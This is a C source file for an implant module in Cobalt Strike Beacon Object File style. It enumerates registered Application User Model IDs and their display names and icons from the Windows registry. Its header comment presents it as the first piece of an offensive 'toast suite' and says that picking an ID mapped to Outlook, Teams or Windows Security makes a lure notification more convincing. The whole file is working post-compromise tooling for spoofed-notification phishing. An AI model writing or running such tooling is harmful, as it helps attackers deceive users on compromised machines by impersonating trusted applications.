/*
 * toast_getaumid - Enumerate registered Application User Model IDs.
 *
 * AUMIDs are registered under:
 *   HKCU\Software\Classes\AppUserModelId
 *   HKLM\Software\Classes\AppUserModelId
 *
 * Each subkey name is an AUMID. An optional DisplayName value gives the
 * user-visible label that would appear on a toast. Picking an AUMID that
 * maps to a trusted app (Outlook, Teams, Windows Security, ...) makes a
 * lure notification far more convincing.
 *
 * Usage: toast_getaumid [/filter:SUBSTRING]
 *
 * This is the warm-up BOF for the toast suite — no WinRT, just registry.
 */

#include <windows.h>
#include "beacon.h"
#include "include/toast_dfr.h"

#define MAX_KEY_NAME 512

static char* wide_to_utf8(const WCHAR* w) {
    if (!w) return NULL;
    int needed = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, w, -1, NULL, 0, NULL, NULL);
    if (needed <= 0) return NULL;
    char* out = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, needed);
    if (!out) return NULL;
    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, w, -1, out, needed, NULL, NULL);
    return out;
}

static void free_utf8(char* s) {
    if (s) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, s);
}

/* True if `hay` (UTF-8) contains `needle` (UTF-8), case-insensitive ASCII. */
static BOOL stri_contains(const char* hay, const char* needle) {
    if (!needle || !*needle) return TRUE;
    if (!hay) return FALSE;
    size_t nl = 0; while (needle[nl]) nl++;
    for (const char* p = hay; *p; p++) {
        size_t i = 0;
        for (; i < nl; i++) {
            char a = p[i]; if (!a) break;
            if (a >= 'A' && a <= 'Z') a = (char)(a + 32);
            char b = needle[i];
            if (b >= 'A' && b <= 'Z') b = (char)(b + 32);
            if (a != b) break;
        }
        if (i == nl) return TRUE;
    }
    return FALSE;
}

/* Read a REG_SZ/REG_EXPAND_SZ value under `hKey` as UTF-8. Returns NULL if missing. */
static char* read_string_value(HKEY hKey, const WCHAR* valueName) {
    DWORD type = 0, cb = 0;
    if (ADVAPI32$RegQueryValueExW(hKey, valueName, NULL, &type, NULL, &cb) != ERROR_SUCCESS) return NULL;
    if (type != REG_SZ && type != REG_EXPAND_SZ) return NULL;
    if (cb == 0) return NULL;
    WCHAR* buf = (WCHAR*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cb + sizeof(WCHAR));
    if (!buf) return NULL;
    if (ADVAPI32$RegQueryValueExW(hKey, valueName, NULL, &type, (LPBYTE)buf, &cb) != ERROR_SUCCESS) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buf);
        return NULL;
    }
    char* utf8 = wide_to_utf8(buf);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buf);
    return utf8;
}

static void enumerate_hive(HKEY root, const char* rootLabel, const char* filter, formatp* out, int* count) {
    HKEY hRoot = NULL;
    if (ADVAPI32$RegOpenKeyExW(root, L"Software\\Classes\\AppUserModelId", 0, KEY_READ, &hRoot) != ERROR_SUCCESS) {
        BeaconFormatPrintf(out, "[-] %s\\Software\\Classes\\AppUserModelId not accessible\n", rootLabel);
        return;
    }

    DWORD index = 0;
    for (;;) {
        WCHAR name[MAX_KEY_NAME];
        DWORD nameLen = MAX_KEY_NAME;
        LSTATUS rc = ADVAPI32$RegEnumKeyExW(hRoot, index++, name, &nameLen, NULL, NULL, NULL, NULL);
        if (rc == ERROR_NO_MORE_ITEMS) break;
        if (rc != ERROR_SUCCESS) break;

        char* aumid_utf8 = wide_to_utf8(name);
        if (!aumid_utf8) continue;

        if (filter && !stri_contains(aumid_utf8, filter)) { free_utf8(aumid_utf8); continue; }

        HKEY hSub = NULL;
        char* display = NULL;
        char* iconUri = NULL;
        if (ADVAPI32$RegOpenKeyExW(hRoot, name, 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
            display = read_string_value(hSub, L"DisplayName");
            iconUri = read_string_value(hSub, L"IconUri");
            ADVAPI32$RegCloseKey(hSub);
        }

        BeaconFormatPrintf(out, "[%s] %s\n", rootLabel, aumid_utf8);
        if (display) BeaconFormatPrintf(out, "       DisplayName : %s\n", display);
        if (iconUri) BeaconFormatPrintf(out, "       IconUri     : %s\n", iconUri);

        free_utf8(display);
        free_utf8(iconUri);
        free_utf8(aumid_utf8);
        (*count)++;
    }

    ADVAPI32$RegCloseKey(hRoot);
}

/* Minimal /name:value parser matching the certify/kerbeus style. */
static char* find_arg(char* buf, int len, const char* name) {
    char needle[64];
    int nl = 0;
    needle[nl++] = '/';
    for (const char* p = name; *p && nl < 62; p++) needle[nl++] = *p;
    needle[nl++] = ':';
    needle[nl] = '\0';

    for (int i = 0; i < len - nl; i++) {
        int j = 0;
        for (; j < nl; j++) if (buf[i + j] != needle[j]) break;
        if (j != nl) continue;
        char* start = buf + i + nl;
        char* end = start;
        while (*end && *end != ' ' && *end != '\t' && *end != '\n' && *end != '\r') end++;
        int vl = (int)(end - start);
        char* v = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, vl + 1);
        if (!v) return NULL;
        for (int k = 0; k < vl; k++) v[k] = start[k];
        return v;
    }
    return NULL;
}

void go(char* args, int alen) {
    char* filter = (args && alen > 0) ? find_arg(args, alen, "filter") : NULL;

    formatp out;
    BeaconFormatAlloc(&out, 16384);
    BeaconFormatPrintf(&out, "[*] Enumerating AppUserModelId registrations\n");
    if (filter) BeaconFormatPrintf(&out, "[*] Filter: %s\n", filter);
    BeaconFormatPrintf(&out, "\n");

    int count = 0;
    enumerate_hive(HKEY_CURRENT_USER, "HKCU", filter, &out, &count);
    enumerate_hive(HKEY_LOCAL_MACHINE, "HKLM", filter, &out, &count);

    BeaconFormatPrintf(&out, "\n[+] %d AUMID entries\n", count);

    int sz = 0;
    char* str = BeaconFormatToString(&out, &sz);
    BeaconOutput(CALLBACK_OUTPUT, str, sz);
    BeaconFormatFree(&out);

    if (filter) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, filter);
}
